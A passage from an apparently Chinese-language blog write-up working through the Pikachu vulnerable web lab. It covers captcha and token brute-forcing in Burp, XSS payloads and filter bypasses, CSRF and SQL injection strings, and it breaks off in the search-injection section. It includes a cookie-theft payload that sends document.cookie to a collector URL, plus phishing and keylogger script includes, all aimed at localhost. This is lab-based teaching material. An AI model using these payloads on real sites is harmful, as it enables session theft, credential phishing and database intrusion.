class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token keyword control-flow" style="color:#00009f">else</span><span class="token plain"> </span><span class="token keyword control-flow" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">inputCode </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> code</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">alert</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;验证码输入错误！&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">createCode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token comment" style="color:#999988;font-style:italic">//刷新验证码</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword control-flow" style="color:#00009f">return</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">false</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword control-flow" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword control-flow" style="color:#00009f">return</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">true</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">createCode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我们可以发现验证码是JavaScript随机生成，点击一次函数运行一次生成一个相应的验证码。</p>
<p>将数据包发送到repeater，更改验证码进行发包依旧提示<img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720150339335.png" alt="image-20230720150339335" class="img_ev3q"></p>
<p>发现该验证码是javascript随机生成的，后台并没有进行校验，我们直接进行爆破就行了</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="token防爆破">token防爆破?<a href="#token防爆破" class="hash-link" aria-label="token防爆破?的直接链接" title="token防爆破?的直接链接">​</a></h3>
<p>输入用户名，密码，发现每次发包token就会更新一次</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720150804635.png" alt="image-20230720150804635" class="img_ev3q"></p>
<p>在密码输入框的下方多一个隐藏的输入框，记录的是token的信息，那么直接拿去burp上开始爆破</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720151146772.png" alt="image-20230720151146772" class="img_ev3q"></p>
<p>模式选择 pitchfork 勾选两个参数，一个是密码，一个是token</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720151403216.png" alt="image-20230720151403216" class="img_ev3q"></p>
<p>token参数选择递归提取类型</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720151756588.png" alt="image-20230720151756588" class="img_ev3q"></p>
<p>点击选项找到<code>检索-提取</code>进行添加，先点击获得响应，再选中token，重定向选择为总是</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720152159863.png" alt="image-20230720152159863" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720151931006.png" alt="image-20230720151931006" class="img_ev3q"></p>
<p>再将线程设置为单线程</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720152345438.png" alt="image-20230720152345438" class="img_ev3q"></p>
<p>根据长度判断</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720152522273.png" alt="image-20230720152522273" class="img_ev3q"></p>
<p>爆破成功，得到admin的密码为123456</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="跨站脚本攻击xss">跨站脚本攻击(xss)<a href="#跨站脚本攻击xss" class="hash-link" aria-label="跨站脚本攻击(xss)的直接链接" title="跨站脚本攻击(xss)的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="反射型xssget">反射型XSS(get)<a href="#反射型xssget" class="hash-link" aria-label="反射型XSS(get)的直接链接" title="反射型XSS(get)的直接链接">​</a></h3>
<p>反射性，一次性的，刷新页面之后弹窗消失。GET是以url方式提交数据的。</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">script</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token function" style="color:#d73a49">alert</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">666</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">script</span><span class="token operator" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230725194934531.png" alt="image-20230725194934531" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="反射型xsspost">反射型XSS(post)<a href="#反射型xsspost" class="hash-link" aria-label="反射型XSS(post)的直接链接" title="反射型XSS(post)的直接链接">​</a></h3>
<p>POST是以表单方式在请求体里面提交</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230725195339871.png" alt="image-20230725195339871" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="存储型xss">存储型XSS<a href="#存储型xss" class="hash-link" aria-label="存储型XSS的直接链接" title="存储型XSS的直接链接">​</a></h3>
<p>存储型和反射型漏洞形成的原因是一样的，而存储型xss可以将脚本保存到后台，造成更大的伤害，也成为永久永久型xss。</p>
<p>永久型的xss，刷新页面后弹窗依旧存在</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="dom型xss">DOM型xss<a href="#dom型xss" class="hash-link" aria-label="DOM型xss的直接链接" title="DOM型xss的直接链接">​</a></h3>
<p>这里是标签的href属性，直接javascript伪协议</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">javascript:alert(6)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>出现弹窗</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="dom型xss-x">DOM型xss-x<a href="#dom型xss-x" class="hash-link" aria-label="DOM型xss-x的直接链接" title="DOM型xss-x的直接链接">​</a></h3>
<p>查看源码</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230726151924912.png" alt="image-20230726151924912" class="img_ev3q"></p>
<p>发现还是href属性，构造一个闭合或使用javascript伪协议</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="xss盲打">XSS盲打<a href="#xss盲打" class="hash-link" aria-label="XSS盲打的直接链接" title="XSS盲打的直接链接">​</a></h3>
<p>我们直接在输入框里插js代码，后端有漏洞就就可以<code>x</code>成功</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>登录后台账号，发现被弹</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729132816754.png" alt="image-20230729132816754" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="xss之过滤">XSS之过滤<a href="#xss之过滤" class="hash-link" aria-label="XSS之过滤的直接链接" title="XSS之过滤的直接链接">​</a></h3>
<p>绕过方法</p>
<p>前端有过滤的，可以直接修改前端代码</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//大小写绕过</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;sCRipt&gt;aLErt(&quot;xss&quot;)&lt;?/ScRipT&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//拼凑绕过</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;scri &lt;script &gt;pt&gt;alert(&quot;xss&quot;)&lt;/scri &lt;/script&gt; pt&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//编码绕过</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;img src=c onerror=&quot;alert(&quot;xss&quot;)&quot;/&gt; //img标签</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//html编码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;img src=c onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&quot;&gt; </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>输入<code>&lt;script&gt;&quot;:#&#x27;@</code></p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729144851237.png" alt="image-20230729144851237" class="img_ev3q"></p>
<p>应该是script被过滤了，大小写进行绕过</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="xss之htmlspecialchars函数">xss之htmlspecialchars()函数<a href="#xss之htmlspecialchars函数" class="hash-link" aria-label="xss之htmlspecialchars()函数的直接链接" title="xss之htmlspecialchars()函数的直接链接">​</a></h3>
<p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p>
<p>它可以将字符串中的特殊字符（如<code>&lt;&gt;</code>等）转换为了HTML实体，以防止跨站点脚本攻击（XSS）</p>
<p>输入<code>6666;&quot;&#x27;&lt;&gt;</code>,查看源码，发现只有单引号<code>&#x27;</code>没有被编码</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729184054693.png" alt="image-20230729184054693" class="img_ev3q"></p>
<p>我们可以构造一个闭合，<code>&#x27; onclick=&#x27;alert(666)&#x27;</code>,也可以输入<code>javascript:alert(666)</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="xss之href输出和js输出">xss之href输出和js输出<a href="#xss之href输出和js输出" class="hash-link" aria-label="xss之href输出和js输出的直接链接" title="xss之href输出和js输出的直接链接">​</a></h3>
<p>输入<code>javascript:alert(666)</code></p>
<p>js输出的源码</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729184822985.png" alt="image-20230729184822985" class="img_ev3q"></p>
<p>构造闭合<code>&#x27;&lt;/script&gt;&lt;script&gt;alert(666)&lt;/script&gt;</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="xss的危害">xss的危害<a href="#xss的危害" class="hash-link" aria-label="xss的危害的直接链接" title="xss的危害的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="获取cookie">获取cookie<a href="#获取cookie" class="hash-link" aria-label="获取cookie的直接链接" title="获取cookie的直接链接">​</a></h4>
<p>我们利用pikachu的xss后台获取cookie</p>
<p>构造payload</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;script&gt;document.location = &#x27;http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27; +document.cookie;&lt;/script&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>将他输入反射型xss中，打开后台</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729190509558.png" alt="image-20230729190509558" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="钓鱼获取账户密码">钓鱼获取账户密码<a href="#钓鱼获取账户密码" class="hash-link" aria-label="钓鱼获取账户密码的直接链接" title="钓鱼获取账户密码的直接链接">​</a></h4>
<p>嵌入代码</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;script src=&quot;http://127.0.0.1/pikachu/pkxss/xfish/fish.php&quot;&gt;&lt;/script&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>会弹出一个登录框</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729191017804.png" alt="image-20230729191017804" class="img_ev3q"></p>
<p>我们输入账号密码，数据会存到后台可以进行查看</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="获取键盘记录">获取键盘记录<a href="#获取键盘记录" class="hash-link" aria-label="获取键盘记录的直接链接" title="获取键盘记录的直接链接">​</a></h4>
<p>同源策略规定，两个不同域名之间不能使用JS进行相互操作。</p>
<p>所以我们需要允许跨域访问</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729201339674.png" alt="image-20230729201339674" class="img_ev3q"></p>
<p>嵌入代码</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;script src=&quot;http://127.0.0.1/pikachu/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>打开控制台，在页面随便敲键盘，在后台可以看到输入数据</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729201539875.png" alt="image-20230729201539875" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="csrf跨站请求伪造">CSRF(跨站请求伪造)<a href="#csrf跨站请求伪造" class="hash-link" aria-label="CSRF(跨站请求伪造)的直接链接" title="CSRF(跨站请求伪造)的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="概述">概述<a href="#概述" class="hash-link" aria-label="概述的直接链接" title="概述的直接链接">​</a></h3>
<p>CSRF的攻击场景中攻击者会伪造一个请求(这个请求一般是一 个链接)，
然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击也就完成了。</p>
<p>csrf攻击前，首先需要用户的权限，再诱导用户再点击这个请求完成攻击。</p>
<p>csrf是借用用户的权限进行攻击，xss是直接盗用用户的身份在进行攻击。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="csrfgetpost">CSRF(get/post)<a href="#csrfgetpost" class="hash-link" aria-label="CSRF(get/post)的直接链接" title="CSRF(get/post)的直接链接">​</a></h3>
<p>GET型</p>
<p>进入修改信息的界面，提交修改信息的请求会在url中体现</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=&amp;add=&amp;email=&amp;submit=submit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我们在url中直接修改参数就可以了</p>
<p>POST型</p>
<p>post型是通过表单进行请求</p>
<p>我们可以利用bp抓包工具生成一个csrf poc</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230731200210267.png" alt="image-20230731200210267" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230731200242543.png" alt="image-20230731200242543" class="img_ev3q"></p>
<p>我们直接在浏览器运行一下</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230731200408502.png" alt="image-20230731200408502" class="img_ev3q"></p>
<p>提交申请，我们直接会跳转到个人中心，并且信息也被修改了</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230731200625952.png" alt="image-20230731200625952" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="csrftoken">CSRF(Token)<a href="#csrftoken" class="hash-link" aria-label="CSRF(Token)的直接链接" title="CSRF(Token)的直接链接">​</a></h3>
<p>在修改信息时，可以在加一个token参数（随机，每次都不一样）</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">http://127.0.0.1/pikachu/vul/csrf/csrftoken/token_get_edit.php?sex=2&amp;phonenum=&amp;add=&amp;email=&amp;token=1436064c7a4e2888e1609686874&amp;submit=submit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>每个token只能用一次，所以我们只能在修改信息前进行抓包，再修改信息。所以，token是防止csrf的一种方式。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="sql注入">SQL注入<a href="#sql注入" class="hash-link" aria-label="SQL注入的直接链接" title="SQL注入的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="概述-1">概述<a href="#概述-1" class="hash-link" aria-label="概述的直接链接" title="概述的直接链接">​</a></h3>
<p>SQL注入漏洞就是，前端的数据传到后台进行处理时，因没有做严格的过滤，导致数据中的sql语句执行，数据库被攻击。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="数字型注入">数字型注入<a href="#数字型注入" class="hash-link" aria-label="数字型注入的直接链接" title="数字型注入的直接链接">​</a></h3>
<p>数字型不用考虑闭合<code>id=1 or 1=1#</code></p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806154234855.png" alt="image-20230806154234855" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="字符型注入">字符型注入<a href="#字符型注入" class="hash-link" aria-label="字符型注入的直接链接" title="字符型注入的直接链接">​</a></h3>
<p>后台查询语句是<code>select id,email from member where username=&#x27;$name&#x27;</code></p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806154412848.png" alt="image-20230806154412848" class="img_ev3q"></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">name=kobe&#x27; //mysql报错</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">name=kobe&#x27;&#x27; //页面正常，判断为字符型</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">name=kobe&#x27; or 1=1# //回显所有数据</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806154906784.png" alt="image-20230806154906784" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="搜索型注入">搜索型注入<a href="#搜索型注入" class="hash-link" aria-label="搜索型注入的直接链接" title="搜索型注入的直接链接">​</a></h3>
<p>后台查询语句</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806155415980.png" alt="image-20230806155415980" class="img_ev3q"></p>
